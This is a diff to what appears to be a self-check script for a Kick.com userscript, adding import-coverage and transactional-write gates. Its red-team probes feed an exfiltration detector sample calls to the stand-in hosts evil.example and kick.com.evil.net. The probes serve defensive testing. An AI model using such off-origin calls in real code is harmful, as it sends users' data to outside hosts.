@@ -93,6 +93,24 @@ const shadowAccessibilityWired = (bundle) => {
   return flags.has('large-targets') && flags.has('reduce-motion');
 };
 
+/**
+ * Every backup store must be read out of the import result inside
+ * `applyImportedStores`. Derived from the registry rather than a hand-listed
+ * set of `gmSet(...)` lines: the previous version named the exact write calls,
+ * so restructuring the function into one staged transaction broke the gate
+ * without anything actually going missing, and a store added later was never
+ * covered at all. `settings` arrives as `result.value`.
+ */
+const importBody = (() => {
+  const start = source.indexOf('function applyImportedStores');
+  return start === -1 ? '' : source.slice(start, source.indexOf('\n}', start));
+})();
+const importGapsIn = (body) => STORAGE_STORES
+  .filter((store) => store.backup)
+  .map((store) => (store.field === 'settings' ? 'result.value' : `result.${store.field}`))
+  .filter((reference) => !String(body).includes(reference));
+const importGaps = importGapsIn(importBody);
+
 const checks = [
   // The detail goes in the label, not the value: this loop treats any truthy
   // value as a pass, so `gaps.length === 0 || gaps.join()` would report success
@@ -105,6 +123,15 @@ const checks = [
   ['targets Kick HTTPS', source.includes('// @match        https://kick.com/*')],
   ['contains no remote code dependency', !/@require\s|@resource\s/i.test(source)],
   ['ships settings UI', source.includes('data-kf-settings-shell')],
+  // An import writes ten stores. Committing them one at a time is how a quota
+  // ceiling produces a configuration that is half the file and half the old
+  // one, so the import must go through the staged path, not bare per-key sets.
+  ['import commits every store as one sized transaction',
+    bundleTargets.every(([, bundleSource]) => bundleSource.includes('function gmSetMany')
+      && bundleSource.includes('planStorageCommit(entries)')
+      && /const commit = applyImportedStores\(result\)/.test(bundleSource))],
+  ['the userscript batches multi-store writes through GM_setValues',
+    source.includes("typeof GM_setValues === 'function'") && source.includes('// @grant        GM_setValues')],
   ['larger targets and reduce motion reach the mod own shadow controls in every bundle',
     bundleTargets.every(([, bundleSource]) => shadowAccessibilityWired(bundleSource))],
   ['the shadow host is actually stamped with those flags',
@@ -167,11 +194,8 @@ const checks = [
     && source.includes('state.stickerPreferences.library.delete(key)')],
   ['export payload covers every registered backup store', STORAGE_STORES.filter((store) => store.backup)
     .every((store) => (store.field === 'settings' ? ('probe' in exportProbe) : (store.field in exportProbe)))],
-  ['import restores every backup store', source.includes('function applyImportedStores')
-    && source.includes('gmSet(CHANNEL_LAYOUT_KEY, result.channelLayouts)')
-    && source.includes('state.channelNotes = result.channelNotes')
-    && source.includes('state.mediaPreferences = result.mediaPreferences')
-    && source.includes('new Set(result.favoriteChannels)')],
+  [`import restores every backup store${importGaps.length ? ` — missing ${importGaps.join(', ')}` : ''}`,
+    source.includes('function applyImportedStores') && importGaps.length === 0],
   ['import drops prototype-pollution keys and is non-destructive', source.includes('POLLUTION_KEYS')
     && source.includes('PRE_IMPORT_BACKUP_KEY')
     && source.includes('function undoImport')],
@@ -496,6 +520,11 @@ const redProbes = [
   ['exfil gate would catch an off-origin api call', EXFIL_REGEX.test('fetch(`https://evil.example/api/v1/log`)')],
   ['exfil gate would catch a lookalike host', EXFIL_REGEX.test('https://kick.com.evil.net/api/v1/log')],
   ['shadow-a11y gate would reject a bundle with no host-keyed rules', !shadowAccessibilityWired('')],
+  // The import-coverage gate is derived from the registry, so prove it reports
+  // gaps rather than vacuously agreeing with whatever the function happens to
+  // contain — an empty body must come back as every store missing.
+  ['import-coverage gate would report an applyImportedStores that reads nothing',
+    importGapsIn('').length === STORAGE_STORES.filter((store) => store.backup).length],
   // Firefox has never implemented :host-context(), so a rule written that way
   // would style Chromium and silently skip the Firefox artifact.
   ['shadow-a11y gate would reject :host-context, which Firefox does not implement',
